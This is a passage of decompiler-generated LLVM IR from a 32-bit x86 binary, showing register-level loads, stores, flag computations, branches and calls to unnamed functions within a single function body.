  %v2_8049326 = add i32 %v1_8049325, -8
  %v3_8049326 = inttoptr i32 %v2_8049326 to i32*
  store i32 %v0_8049326, i32* %v3_8049326, align 4
  %v1_8049327 = add i32 %v1_8049325, 76
  %v2_8049327 = inttoptr i32 %v1_8049327 to i32*
  %v3_8049327 = load i32, i32* %v2_8049327, align 4
  store i32 %v3_8049327, i32* %edx.global-to-local, align 4
  %v0_804932b = load i32, i32* %eax.global-to-local, align 4
  %v2_804932b = add i32 %v3_8049327, 1472
  %v3_804932b = add i32 %v2_804932b, %v0_804932b
  store i32 %v3_804932b, i32* %eax.global-to-local, align 4
  %v2_8049332 = add i32 %v1_8049325, -12
  %v3_8049332 = inttoptr i32 %v2_8049332 to i32*
  store i32 %v3_804932b, i32* %v3_8049332, align 4
  %v0_8049333 = load i32, i32* @esi, align 4
  %v2_8049333 = add i32 %v1_8049325, -16
  %v3_8049333 = inttoptr i32 %v2_8049333 to i32*
  store i32 %v0_8049333, i32* %v3_8049333, align 4
  %v0_8049334 = call i32 @function_8052060()
  store i32 %v0_8049334, i32* %eax.global-to-local, align 4
  %v0_8049339 = load i32, i32* @esp, align 4
  %v1_8049339 = add i32 %v0_8049339, 16
  %v3_804933c = trunc i32 %v0_8049334 to i8
  %v4_804933c = icmp eq i8 %v3_804933c, 0
  store i1 %v4_804933c, i1* %zf.global-to-local, align 1
  %v1_804933e = icmp eq i1 %v4_804933c, false
  br i1 %v1_804933e, label %dec_label_pc_8049301, label %dec_label_pc_8049340

dec_label_pc_8049340:                             ; preds = %dec_label_pc_8049322
  %v1_8049340 = add i32 %v0_8049339, 20916
  %v2_8049340 = inttoptr i32 %v1_8049340 to i32*
  %v3_8049340 = load i32, i32* %v2_8049340, align 4
  store i32 %v3_8049340, i32* %eax.global-to-local, align 4
  %v1_8049347 = add i32 %v0_8049339, 108
  %v2_8049347 = inttoptr i32 %v1_8049347 to i32*
  %v3_8049347 = load i32, i32* %v2_8049347, align 4
  store i32 %v3_8049347, i32* %ecx.global-to-local, align 4
  %v1_804934b = add i32 %v3_8049340, 1
  store i32 %v1_804934b, i32* %eax.global-to-local, align 4
  store i32 %v1_804934b, i32* %v2_8049340, align 4
  %v0_8049353 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8049353 = add i32 %v0_8049353, 16
  %v2_8049353 = inttoptr i32 %v1_8049353 to i32*
  %v3_8049353 = load i32, i32* %v2_8049353, align 4
  %v4_8049353 = load i32, i32* %eax.global-to-local, align 4
  %v5_8049353 = sub i32 %v3_8049353, %v4_8049353
  %v11_8049353 = xor i32 %v4_8049353, %v3_8049353
  %v12_8049353 = xor i32 %v5_8049353, %v3_8049353
  %v13_8049353 = and i32 %v12_8049353, %v11_8049353
  %v14_8049353 = icmp slt i32 %v13_8049353, 0
  %v15_8049353 = icmp eq i32 %v5_8049353, 0
  store i1 %v15_8049353, i1* %zf.global-to-local, align 1
  %v16_8049353 = icmp slt i32 %v5_8049353, 0
  %v3_8049356 = icmp eq i1 %v16_8049353, %v14_8049353
  %v4_8049356 = icmp eq i1 %v15_8049353, false
  %v5_8049356 = and i1 %v4_8049356, %v3_8049356
  br i1 %v5_8049356, label %dec_label_pc_8049322, label %dec_label_pc_8049358

dec_label_pc_8049358:                             ; preds = %dec_label_pc_8049340, %dec_label_pc_804930a
  %v0_8049358 = load i32, i32* @esp, align 4
  %v9_8049358 = icmp eq i32 %v0_8049358, 12
  store i1 %v9_8049358, i1* %zf.global-to-local, align 1
  %v0_804935b = load i32, i32* @esi, align 4
  %v2_804935b = add i32 %v0_8049358, -16
  %v3_804935b = inttoptr i32 %v2_804935b to i32*
  store i32 %v0_804935b, i32* %v3_804935b, align 4
  %v2_804935c = call i32 @function_8051ca0(i8* %v1_8048752)
  store i32 %v2_804935c, i32* %eax.global-to-local, align 4
  %v0_8049361 = load i32, i32* @esp, align 4
  %v1_8049361 = add i32 %v0_8049361, 16
  %v1_8049364 = add i32 %v2_804935c, -127
  %v6_8049364 = sub i32 126, %v2_804935c
  %v7_8049364 = and i32 %v6_8049364, %v2_804935c
  %v8_8049364 = icmp slt i32 %v7_8049364, 0
  %v9_8049364 = icmp eq i32 %v1_8049364, 0
  store i1 %v9_8049364, i1* %zf.global-to-local, align 1
  %v10_8049364 = icmp slt i32 %v1_8049364, 0
  %v3_8049367 = icmp eq i1 %v10_8049364, %v8_8049364
  %v4_8049367 = icmp eq i1 %v9_8049364, false
  %v5_8049367 = and i1 %v4_8049367, %v3_8049367
  br i1 %v5_8049367, label %dec_label_pc_8049301, label %dec_label_pc_8049369

dec_label_pc_8049369:                             ; preds = %dec_label_pc_8049358
  %v0_8049369 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049369 = add i32 %v0_8049361, 12
  %v3_8049369 = inttoptr i32 %v2_8049369 to i32*
  store i32 %v0_8049369, i32* %v3_8049369, align 4
  %v0_804936a = load i32, i32* %ecx.global-to-local, align 4
  %v2_804936a = add i32 %v0_8049361, 8
  %v3_804936a = inttoptr i32 %v2_804936a to i32*
  store i32 %v0_804936a, i32* %v3_804936a, align 4
  %v0_804936b = load i32, i32* @esi, align 4
  %v2_804936b = add i32 %v0_8049361, 4
  %v3_804936b = inttoptr i32 %v2_804936b to i32*
  store i32 %v0_804936b, i32* %v3_804936b, align 4
  %v1_804936c = add i32 %v0_8049361, 108
  %v2_804936c = inttoptr i32 %v1_804936c to i32*
  %v3_804936c = load i32, i32* %v2_804936c, align 4
  store i32 %v3_804936c, i32* %edx.global-to-local, align 4
  %v1_8049370 = add i32 %v0_8049361, 92
  %v2_8049370 = inttoptr i32 %v1_8049370 to i32*
  %v3_8049370 = load i32, i32* %v2_8049370, align 4
  store i32 %v3_8049370, i32* %ecx.global-to-local, align 4
  %v1_8049374 = add i32 %v3_804936c, 16
  %v2_8049374 = inttoptr i32 %v1_8049374 to i32*
  %v3_8049374 = load i32, i32* %v2_8049374, align 4
  %v2_8049377 = mul i32 %v3_8049374, 128
  %v3_8049377 = icmp eq i32 %v2_8049377, 0
  store i1 %v3_8049377, i1* %zf.global-to-local, align 1
  %v2_804937a = add i32 %v3_8049370, 1472
  %v3_804937a = add i32 %v2_804937a, %v2_8049377
  store i32 %v3_804937a, i32* %eax.global-to-local, align 4
  %v3_8049381 = inttoptr i32 %v0_8049361 to i32*
  store i32 %v3_804937a, i32* %v3_8049381, align 4
  %v3_8049382 = call i32 @function_8051cc0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049382, i32* %eax.global-to-local, align 4
  %v0_8049387 = load i32, i32* @esp, align 4
  %v1_8049387 = add i32 %v0_8049387, 108
  %v2_8049387 = inttoptr i32 %v1_8049387 to i32*
  %v3_8049387 = load i32, i32* %v2_8049387, align 4
  store i32 %v3_8049387, i32* %eax.global-to-local, align 4
  %v1_804938e = add i32 %v3_8049387, 16
  %v2_804938e = inttoptr i32 %v1_804938e to i32*
  %v3_804938e = load i32, i32* %v2_804938e, align 4
  %v1_8049391 = add i32 %v3_804938e, 1
  %v8_8049391 = icmp eq i32 %v1_8049391, 0
  store i1 %v8_8049391, i1* %zf.global-to-local, align 1
  store i32 %v1_8049391, i32* %edx.global-to-local, align 4
  store i32 %v1_8049391, i32* %v2_804938e, align 4
  %v0_8049301.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049301

dec_label_pc_804939a:                             ; preds = %dec_label_pc_804921b
  %v0_804939a = load i32, i32* %eax.global-to-local, align 4
  %v1_804939a = add i32 %v0_804939a, 1
  %v8_804939a = icmp eq i32 %v1_804939a, 0
  store i1 %v8_804939a, i1* %zf.global-to-local, align 1
  store i32 %v1_804939a, i32* %eax.global-to-local, align 4
  %v0_804939b = load i32, i32* @esi, align 4
  %v2_804939b = add i32 %v0_804939b, %v1_804939a
  store i32 %v2_804939b, i32* %ecx.global-to-local, align 4
  %v2_804939e = add i32 %v0_804923c, 124
  %v3_804939e = inttoptr i32 %v2_804939e to i32*
  store i32 %v2_804939b, i32* %v3_804939e, align 4
  %v0_804924d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804924d

dec_label_pc_80493a7:                             ; preds = %dec_label_pc_8048547
  %v1_80493a7 = add i32 %v0_80485a5, -1440
  %v2_80493a7 = inttoptr i32 %v1_80493a7 to i32*
  %v3_80493a7 = load i32, i32* %v2_80493a7, align 4
  %v1_80493af = urem i32 %v3_80493a7, 32
  store i32 %v1_80493af, i32* %eax.global-to-local, align 4
  %v2_80493b2 = udiv i32 %v3_80493a7, 32
  store i32 %v2_80493b2, i32* %edx.global-to-local, align 4
  %v0_80493b5 = load i32, i32* @esp, align 4
  %v2_80493b5 = mul nuw nsw i32 %v2_80493b2, 4
  %v3_80493b5 = add nuw nsw i32 %v2_80493b5, 20740
  %v4_80493b5 = add i32 %v3_80493b5, %v0_80493b5
  %v5_80493b5 = inttoptr i32 %v4_80493b5 to i32*
  %v6_80493b5 = load i32, i32* %v5_80493b5, align 4
  %v9_80493b5 = shl i32 1, %v1_80493af
  %v12_80493b5 = or i32 %v6_80493b5, %v9_80493b5
  store i32 %v12_80493b5, i32* %v5_80493b5, align 4
  %v0_80493bd = load i32, i32* @esi, align 4
  %v1_80493bd = add i32 %v0_80493bd, -1440
  %v2_80493bd = inttoptr i32 %v1_80493bd to i32*
  %v3_80493bd = load i32, i32* %v2_80493bd, align 4
  store i32 %v3_80493bd, i32* %eax.global-to-local, align 4
  %v1_80493c3 = load i32, i32* @esp, align 4
  %v2_80493c3 = add i32 %v1_80493c3, 72
  %v3_80493c3 = inttoptr i32 %v2_80493c3 to i32*
  %v4_80493c3 = load i32, i32* %v3_80493c3, align 4
  %v5_80493c3 = sub i32 %v3_80493bd, %v4_80493c3
  %v11_80493c3 = xor i32 %v4_80493c3, %v3_80493bd
  %v12_80493c3 = xor i32 %v5_80493c3, %v3_80493bd
  %v13_80493c3 = and i32 %v12_80493c3, %v11_80493c3
  %v14_80493c3 = icmp slt i32 %v13_80493c3, 0
  %v15_80493c3 = icmp eq i32 %v5_80493c3, 0
  store i1 %v15_80493c3, i1* %zf.global-to-local, align 1
  %v16_80493c3 = icmp slt i32 %v5_80493c3, 0
  %v3_80493c7 = icmp ne i1 %v16_80493c3, %v14_80493c3
  %v4_80493c7 = or i1 %v15_80493c3, %v3_80493c7
  br i1 %v4_80493c7, label %dec_label_pc_8048582, label %dec_label_pc_80486e4

dec_label_pc_80493d2:                             ; preds = %dec_label_pc_804920d, %dec_label_pc_80491e0
  %v0_80493d2 = load i32, i32* @edi, align 4
  %v2_80493d2 = add i32 %v0_8049203, 12
  %v3_80493d2 = inttoptr i32 %v2_80493d2 to i32*
  store i32 %v0_80493d2, i32* %v3_80493d2, align 4
  %v0_80493d3 = load i32, i32* @edi, align 4
  %v2_80493d3 = add i32 %v0_8049203, 8
  %v3_80493d3 = inttoptr i32 %v2_80493d3 to i32*
  store i32 %v0_80493d3, i32* %v3_80493d3, align 4
  %v1_80493d4 = add i32 %v0_8049203, 4
  %v2_80493d4 = inttoptr i32 %v1_80493d4 to i32*
  store i32 0, i32* %v2_80493d4, align 4
  %v2_80493d6 = inttoptr i32 %v0_8049203 to i32*
  store i32 38, i32* %v2_80493d6, align 4
  %v3_80493d8 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80493d8, i32* %eax.global-to-local, align 4
  %v0_80493dd = load i32, i32* @esp, align 4
  %v9_80493dd = icmp eq i32 %v0_80493dd, -12
  store i1 %v9_80493dd, i1* %zf.global-to-local, align 1
  %v2_80493e0 = add i32 %v0_80493dd, 8
  %v3_80493e0 = inttoptr i32 %v2_80493e0 to i32*
  store i32 %v3_80493d8, i32* %v3_80493e0, align 4
  %v1_80493e1 = add i32 %v0_80493dd, 120
  %v2_80493e1 = inttoptr i32 %v1_80493e1 to i32*
  %v3_80493e1 = load i32, i32* %v2_80493e1, align 4
  %v2_80493e5 = add i32 %v0_80493dd, 4
  %v3_80493e5 = inttoptr i32 %v2_80493e5 to i32*
  store i32 %v3_80493e1, i32* %v3_80493e5, align 4
  %v1_80493e6 = add i32 %v0_80493dd, 147
  store i32 %v1_80493e6, i32* @ecx, align 4
  %v3_80493ed = inttoptr i32 %v0_80493dd to i32*
  store i32 %v1_80493e6, i32* %v3_80493ed, align 4
  %v4_80493ee = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80493f3 = load i32, i32* @esp, align 4
  %v1_80493f6 = add i32 %v4_80493ee, 1
  %v8_80493f6 = icmp eq i32 %v1_80493f6, 0
  store i1 %v8_80493f6, i1* %zf.global-to-local, align 1
  store i32 %v1_80493f6, i32* %eax.global-to-local, align 4
  br i1 %v8_80493f6, label %dec_label_pc_8049854, label %dec_label_pc_80493fd

dec_label_pc_80493fd:                             ; preds = %dec_label_pc_80493d2
  %v0_80493fd = load i32, i32* @ebx, align 4
  %v2_80493fd = add i32 %v0_80493f3, 12
  %v3_80493fd = inttoptr i32 %v2_80493fd to i32*
  store i32 %v0_80493fd, i32* %v3_80493fd, align 4
  %v0_80493fe = load i32, i32* @ebx, align 4
  %v2_80493fe = add i32 %v0_80493f3, 8
  %v3_80493fe = inttoptr i32 %v2_80493fe to i32*
  store i32 %v0_80493fe, i32* %v3_80493fe, align 4
  %v1_80493ff = add i32 %v0_80493f3, 4
  %v2_80493ff = inttoptr i32 %v1_80493ff to i32*
  store i32 0, i32* %v2_80493ff, align 4
  %v2_8049401 = inttoptr i32 %v0_80493f3 to i32*
  store i32 38, i32* %v2_8049401, align 4
  %v3_8049403 = call i32 @function_80512a0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049403, i32* %eax.global-to-local, align 4
  %v0_8049408 = load i32, i32* @esp, align 4
  %v9_8049408 = icmp eq i32 %v0_8049408, -12
  store i1 %v9_8049408, i1* %zf.global-to-local, align 1
  %v2_804940b = add i32 %v0_8049408, 8
  %v3_804940b = inttoptr i32 %v2_804940b to i32*
  store i32 %v3_8049403, i32* %v3_804940b, align 4
  %v1_804940c = add i32 %v0_8049408, 120
  %v2_804940c = inttoptr i32 %v1_804940c to i32*
  %v3_804940c = load i32, i32* %v2_804940c, align 4
  store i32 %v3_804940c, i32* @ecx, align 4
  %v2_8049410 = add i32 %v0_8049408, 4
  %v3_8049410 = inttoptr i32 %v2_8049410 to i32*
  store i32 %v3_804940c, i32* %v3_8049410, align 4
  %v1_8049411 = add i32 %v0_8049408, 147
  store i32 %v1_8049411, i32* %eax.global-to-local, align 4
  %v3_8049418 = inttoptr i32 %v0_8049408 to i32*
  store i32 %v1_8049411, i32* %v3_8049418, align 4
  %v4_8049419 = call i32 @function_8051f90(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049419, i32* %eax.global-to-local, align 4
  %v0_804941e = load i32, i32* @esp, align 4
  %v6_804941e = icmp eq i32 %v0_804941e, -16
  store i1 %v6_804941e, i1* %zf.global-to-local, align 1
  store i32 %v4_8049419, i32* %ebx.global-to-local, align 4
  %v3_8049423 = add i32 %v4_8049419, 147
  %v4_8049423 = add i32 %v3_8049423, %v0_804941e
  %v5_8049423 = inttoptr i32 %v4_8049423 to i8*
  %v6_8049423 = load i8, i8* %v5_8049423, align 1
  %v12_8049423 = icmp eq i8 %v6_8049423, 32
  %v1_804942b = zext i1 %v12_8049423 to i32
  %v1_804942e = add i32 %v0_804941e, 147
  store i32 %v1_804942e, i32* %esi.global-to-local, align 4
  store i32 %v1_804942b, i32* %eax.global-to-local, align 4
  %v1_804943a = add i32 %v0_804941e, 12
  %v2_804943a = inttoptr i32 %v1_804943a to i32*
  store i32 2, i32* %v2_804943a, align 4
  %v1_804943c = add i32 %v0_804941e, 8
  %v2_804943c = inttoptr i32 %v1_804943c to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b66.10 to i32), i32* %v2_804943c, align 4
  %v0_8049441 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8049441 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049441 = add i32 %v1_8049441, %v0_8049441
  store i32 %v2_8049441, i32* @ebx, align 4
  %v1_8049443 = add i32 %v0_804941e, 120
  %v2_8049443 = inttoptr i32 %v1_8049443 to i32*
  %v3_8049443 = load i32, i32* %v2_8049443, align 4
  %v2_8049447 = sub i32 %v3_8049443, %v2_8049441
  store i32 %v2_8049447, i32* %eax.global-to-local, align 4
  %v0_8049449 = load i32, i32* %esi.global-to-local, align 4
  %v2_8049449 = add i32 %v0_8049449, %v2_8049441
  %v12_8049449 = icmp eq i32 %v2_8049449, 0
  store i1 %v12_8049449, i1* %zf.global-to-local, align 1
  store i32 %v2_8049449, i32* @esi, align 4
  %v2_804944b = add i32 %v0_804941e, 4
  %v3_804944b = inttoptr i32 %v2_804944b to i32*
  store i32 %v2_8049447, i32* %v3_804944b, align 4
  %v0_804944c = load i32, i32* @esi, align 4
  %v3_804944c = inttoptr i32 %v0_804941e to i32*
  store i32 %v0_804944c, i32* %v3_804944c, align 4
  %v0_804944d = call i32 @function_8051d50()
  store i32 %v0_804944d, i32* %eax.global-to-local, align 4
  %v0_8049452 = load i32, i32* @esp, align 4
  store i32 %v0_804944d, i32* %edx.global-to-local, align 4
  %v10_8049457 = icmp eq i32 %v0_804944d, -1
  store i1 %v10_8049457, i1* %zf.global-to-local, align 1
  br i1 %v10_8049457, label %dec_label_pc_8049854, label %dec_label_pc_8049460

dec_label_pc_8049460:                             ; preds = %dec_label_pc_80493fd
  %v10_8049460 = icmp eq i32 %v0_804944d, 1
  store i1 %v10_8049460, i1* %zf.global-to-local, align 1
  %v7_8049463 = icmp sgt i32 %v0_804944d, 1
  br i1 %v7_8049463, label %dec_label_pc_8049465, label %dec_label_pc_8049468

dec_label_pc_8049465:                             ; preds = %dec_label_pc_8049460
  %v1_8049465 = add i32 %v0_804944d, -2
  %v9_8049465 = icmp eq i32 %v1_8049465, 0
  store i1 %v9_8049465, i1* %zf.global-to-local, align 1
  store i32 %v1_8049465, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049468

dec_label_pc_8049468:                             ; preds = %dec_label_pc_8049460, %dec_label_pc_8049465
  %v0_8049471 = phi i32 [ %v0_804944d, %dec_label_pc_8049460 ], [ %v1_8049465, %dec_label_pc_8049465 ]
  %v1_8049468 = add i32 %v0_8049452, 20920
  %v1_804946f = load i32, i32* @ebx, align 4
  %v2_804946f = add i32 %v1_8049468, %v1_804946f
  %v12_804946f = icmp eq i32 %v2_804946f, 0
  store i1 %v12_804946f, i1* %zf.global-to-local, align 1
  store i32 %v2_804946f, i32* %eax.global-to-local, align 4
  %v1_8049471 = add i32 %v0_8049471, 1
  store i32 %v1_8049471, i32* @ebx, align 4
  %v2_8049474 = add i32 %v0_8049471, -20773
  %v3_8049474 = add i32 %v2_8049474, %v2_804946f
  %v4_8049474 = inttoptr i32 %v3_8049474 to i8*
  store i8 0, i8* %v4_8049474, align 1
  %v0_804947c = load i32, i32* @esp, align 4
  %v1_804947c = add i32 %v0_804947c, -4
  %v2_804947c = inttoptr i32 %v1_804947c to i32*
  store i32 4, i32* %v2_804947c, align 4
  %v1_804947e = add i32 %v0_804947c, -8
  %v2_804947e = inttoptr i32 %v1_804947e to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_8054b6b.15 to i32), i32* %v2_804947e, align 4
  %v0_8049483 = load i32, i32* @ebx, align 4
  %v2_8049483 = add i32 %v0_804947c, -12
  %v3_8049483 = inttoptr i32 %v2_8049483 to i32*
  store i32 %v0_8049483, i32* %v3_8049483, align 4
  %v0_8049484 = load i32, i32* @esi, align 4
  %v2_8049484 = add i32 %v0_804947c, -16
  %v3_8049484 = inttoptr i32 %v2_8049484 to i32*
  store i32 %v0_8049484, i32* %v3_8049484, align 4
  %v0_8049485 = call i32 @function_8051d50()
  store i32 %v0_8049485, i32* @eax, align 4
  %v0_804948a = load i32, i32* @esp, align 4
  %v9_804948d = icmp eq i32 %v0_8049485, 4
  store i1 %v9_804948d, i1* %zf.global-to-local, align 1
  br i1 %v9_804948d, label %dec_label_pc_8049b1d, label %dec_label_pc_8049496

dec_label_pc_8049496:                             ; preds = %dec_label_pc_8049468
  %v1_804948a = add i32 %v0_804948a, 16
  %v0_8049496 = load i32, i32* @esi, align 4
  %v1_8049496 = inttoptr i32 %v0_8049496 to i8*
  %v2_8049496 = load i8, i8* %v1_8049496, align 1
  %v11_8049496 = icmp eq i8 %v2_8049496, 47
  store i1 %v11_8049496, i1* %zf.global-to-local, align 1
  br i1 %v11_8049496, label %dec_label_pc_8049c88, label %dec_label_pc_804949f

dec_label_pc_804949f:                             ; preds = %dec_label_pc_8049cbd, %dec_label_pc_8049c88, %dec_label_pc_8049bdf, %dec_label_pc_8049bbc, %dec_label_pc_8049496, %dec_label_pc_8049c14
  %v0_804949f = phi i32 [ %v1_8049cd2, %dec_label_pc_8049cbd ], [ %v1_8049cb2, %dec_label_pc_8049c88 ], [ %v1_8049c09, %dec_label_pc_8049bdf ], [ %v1_8049bd1, %dec_label_pc_8049bbc ], [ %v1_804948a, %dec_label_pc_8049496 ], [ %v1_8049c29, %dec_label_pc_8049c14 ]
  %v1_804949f = add i32 %v0_804949f, 92
  %v2_804949f = inttoptr i32 %v1_804949f to i32*
  %v3_804949f = load i32, i32* %v2_804949f, align 4
  store i32 %v3_804949f, i32* %edx.global-to-local, align 4
  %v1_80494a3 = add i32 %v3_804949f, -1448
  %v2_80494a3 = inttoptr i32 %v1_80494a3 to i8*
  store i8 1, i8* %v2_80494a3, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80494af:                             ; preds = %dec_label_pc_8048d81
  %v1_80494af = call i32 @function_8052779(i32 %stack_var_-20924.0.ph)
  store i32 %v1_80494af, i32* %eax.global-to-local, align 4
  %v0_80494b4 = load i32, i32* @esp, align 4
  %v1_80494b4 = add i32 %v0_80494b4, 76
  %v2_80494b4 = inttoptr i32 %v1_80494b4 to i32*
  %v3_80494b4 = load i32, i32* %v2_80494b4, align 4
  store i32 %v3_80494b4, i32* %ecx.global-to-local, align 4
  %v1_80494b8 = add i32 %v0_80494b4, 92
  %v2_80494b8 = inttoptr i32 %v1_80494b8 to i32*
  %v3_80494b8 = load i32, i32* %v2_80494b8, align 4
  store i32 %v3_80494b8, i32* %edx.global-to-local, align 4
  %v1_80494be = add i32 %v3_80494b4, 1472
  store i32 %v1_80494be, i32* @ebp, align 4
  store i32 %v1_80494af, i32* @edi, align 4
  %v1_80494c6 = add i32 %v3_80494b4, 2116
  store i32 %v1_80494c6, i32* @esi, align 4
  %v1_80494cc = add i32 %v3_80494b8, 660
  %v2_80494cc = inttoptr i32 %v1_80494cc to i32*
  %v3_80494cc = load i32, i32* %v2_80494cc, align 4
  %v9_80494cc = icmp eq i32 %v3_80494cc, 1024
  store i1 %v9_80494cc, i1* %zf.global-to-local, align 1
  br i1 %v9_80494cc, label %dec_label_pc_8049605, label %dec_label_pc_80494dc

dec_label_pc_80494dc:                             ; preds = %dec_label_pc_80494af, %dec_label_pc_8049605, %dec_label_pc_80495f1
  %v0_80494dc = phi i32 [ %v0_80495e0, %dec_label_pc_80495f1 ], [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80494dc.pre.pre, %dec_label_pc_8049605 ]
  %v1_80494dc = add i32 %v0_80494dc, 92
  %v2_80494dc = inttoptr i32 %v1_80494dc to i32*
  %v3_80494dc = load i32, i32* %v2_80494dc, align 4
  store i32 %v3_80494dc, i32* %eax.global-to-local, align 4
  %v0_80494e0 = load i32, i32* @edi, align 4
  %v1_80494e0 = inttoptr i32 %v0_80494e0 to i32*
  store i32 0, i32* %v1_80494e0, align 4
  %v0_80494e6 = load i32, i32* %eax.global-to-local, align 4
  %v1_80494e6 = add i32 %v0_80494e6, 660
  %v2_80494e6 = inttoptr i32 %v1_80494e6 to i32*
  %v3_80494e6 = load i32, i32* %v2_80494e6, align 4
  store i32 %v3_80494e6, i32* %edx.global-to-local, align 4
  %v2_80494f1 = sub i32 1024, %v3_80494e6
  %v12_80494f1 = icmp eq i32 %v2_80494f1, 0
  store i1 %v12_80494f1, i1* %zf.global-to-local, align 1
  store i32 %v2_80494f1, i32* %eax.global-to-local, align 4
  %v0_80494f3 = load i32, i32* @esp, align 4
  %v1_80494f3 = add i32 %v0_80494f3, -4
  %v2_80494f3 = inttoptr i32 %v1_80494f3 to i32*
  store i32 16384, i32* %v2_80494f3, align 4
  %v0_80494f8 = load i32, i32* @esi, align 4
  %v1_80494f8 = load i32, i32* %edx.global-to-local, align 4
  %v2_80494f8 = add i32 %v1_80494f8, %v0_80494f8
  store i32 %v2_80494f8, i32* %edx.global-to-local, align 4
  %v0_80494fb = load i32, i32* %eax.global-to-local, align 4
  %v2_80494fb = add i32 %v0_80494f3, -8
  %v3_80494fb = inttoptr i32 %v2_80494fb to i32*
  store i32 %v0_80494fb, i32* %v3_80494fb, align 4
  %v0_80494fc = load i32, i32* %edx.global-to-local, align 4
  %v2_80494fc = add i32 %v0_80494f3, -12
  %v3_80494fc = inttoptr i32 %v2_80494fc to i32*
  store i32 %v0_80494fc, i32* %v3_80494fc, align 4
  %v1_80494fd = add i32 %v0_80494f3, 92
  %v2_80494fd = inttoptr i32 %v1_80494fd to i32*
  %v3_80494fd = load i32, i32* %v2_80494fd, align 4
  store i32 %v3_80494fd, i32* %edx.global-to-local, align 4
  %v1_8049501 = add i32 %v3_80494fd, -1452
  %v2_8049501 = inttoptr i32 %v1_8049501 to i32*
  %v3_8049501 = load i32, i32* %v2_8049501, align 4
  store i32 %v3_8049501, i32* %eax.global-to-local, align 4
  %v2_8049507 = add i32 %v0_80494f3, -16
  %v3_8049507 = inttoptr i32 %v2_8049507 to i32*
  store i32 %v3_8049501, i32* %v3_8049507, align 4
  %v0_8049508 = call i32 @function_805290e()
  store i32 %v0_8049508, i32* %eax.global-to-local, align 4
  %v0_804950d = load i32, i32* @esp, align 4
  %v1_804950d = add i32 %v0_804950d, 16
  %v1_8049510 = icmp eq i32 %v0_8049508, 0
  store i1 %v1_8049510, i1* %zf.global-to-local, align 1
  br i1 %v1_8049510, label %dec_label_pc_8048e44, label %dec_label_pc_8049518

dec_label_pc_8049518:                             ; preds = %dec_label_pc_80494dc
  %v10_8049518 = icmp eq i32 %v0_8049508, -1
  store i1 %v10_8049518, i1* %zf.global-to-local, align 1
  br i1 %v10_8049518, label %dec_label_pc_8049b0f, label %dec_label_pc_8049521

dec_label_pc_8049521:                             ; preds = %dec_label_pc_8049518
  %v1_8049521 = add i32 %v0_804950d, 108
  %v2_8049521 = inttoptr i32 %v1_8049521 to i32*
  %v3_8049521 = load i32, i32* %v2_8049521, align 4
  store i32 %v3_8049521, i32* %edx.global-to-local, align 4
  %v1_8049525 = add i32 %v3_8049521, 660
  %v2_8049525 = inttoptr i32 %v1_8049525 to i32*
  %v3_8049525 = load i32, i32* %v2_8049525, align 4
  %v2_804952b = add i32 %v3_8049525, %v0_8049508
  %v12_804952b = icmp eq i32 %v2_804952b, 0
  store i1 %v12_804952b, i1* %zf.global-to-local, align 1
  store i32 %v2_804952b, i32* %ecx.global-to-local, align 4
  store i32 %v2_804952b, i32* %v2_8049525, align 4
  %v0_8049533 = load i32, i32* @esp, align 4
  %v1_8049533 = add i32 %v0_8049533, 116
  %v2_8049533 = inttoptr i32 %v1_8049533 to i32*
  %v3_8049533 = load i32, i32* %v2_8049533, align 4
  store i32 %v3_8049533, i32* %ecx.global-to-local, align 4
  %v1_8049537 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049537 = add i32 %v1_8049537, -1444
  %v3_8049537 = inttoptr i32 %v2_8049537 to i32*
  store i32 %v3_8049533, i32* %v3_8049537, align 4
  %v0_80495d1.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_8049542:                             ; preds = %dec_label_pc_80495d1
  %v1_8049542 = add i32 %v0_8049542, 660
  %v2_8049542 = inttoptr i32 %v1_8049542 to i32*
  %v3_8049542 = load i32, i32* %v2_8049542, align 4
  store i32 %v3_8049542, i32* %edx.global-to-local, align 4
  store i32 %v3_80495d1, i32* @ebx, align 4
  %v2_804954a = sub i32 %v3_80495d1, %v3_8049542
  %v8_804954a = xor i32 %v3_8049542, %v3_80495d1
  %v9_804954a = xor i32 %v2_804954a, %v3_80495d1
  %v10_804954a = and i32 %v9_804954a, %v8_804954a
  %v11_804954a = icmp slt i32 %v10_804954a, 0
  %v12_804954a = icmp eq i32 %v2_804954a, 0
  store i1 %v12_804954a, i1* %zf.global-to-local, align 1
  %v13_804954a = icmp slt i32 %v2_804954a, 0
  %v3_804954c = icmp ne i1 %v13_804954a, %v11_804954a
  %v4_804954c = or i1 %v12_804954a, %v3_804954c
  br i1 %v4_804954c, label %dec_label_pc_8049550, label %dec_label_pc_804954e

dec_label_pc_804954e:                             ; preds = %dec_label_pc_8049542
  store i32 %v3_8049542, i32* @ebx, align 4
  br label %dec_label_pc_8049550

dec_label_pc_8049550:                             ; preds = %dec_label_pc_8049542, %dec_label_pc_804954e
  %v1_8049554 = phi i32 [ %v3_80495d1, %dec_label_pc_8049542 ], [ %v3_8049542, %dec_label_pc_804954e ]
  %v0_8049550 = load i32, i32* @esp, align 4
  %v1_8049550 = add i32 %v0_8049550, 92
  %v2_8049550 = inttoptr i32 %v1_8049550 to i32*
  %v3_8049550 = load i32, i32* %v2_8049550, align 4
  store i32 %v3_8049550, i32* %edx.global-to-local, align 4
  %v2_8049554 = sub i32 %v3_80495d1, %v1_8049554
  store i32 %v2_8049554, i32* %eax.global-to-local, align 4
  %v2_8049556 = add i32 %v3_8049550, 12
